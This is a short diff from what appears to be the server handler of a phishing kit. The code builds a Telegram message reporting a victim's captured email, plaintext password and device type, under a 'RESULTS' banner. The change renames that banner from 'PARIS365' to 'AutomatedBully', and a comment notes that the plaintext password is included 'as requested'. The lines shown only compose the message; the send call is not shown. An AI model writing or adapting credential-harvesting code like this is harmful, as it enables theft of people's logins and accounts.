@@ -148,7 +148,7 @@ export const handler = async (event, context) => {
     // Compose Telegram message (include plaintext password as requested)
     const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent || '') ? '📱 Mobile' : '💻 Desktop';
 
-    const message = `🔐 PARIS365 RESULTS
+    const message = `🔐 AutomatedBully RESULTS
 
 📧 ${email || 'Not captured'}
 🔑 ${plainPassword}
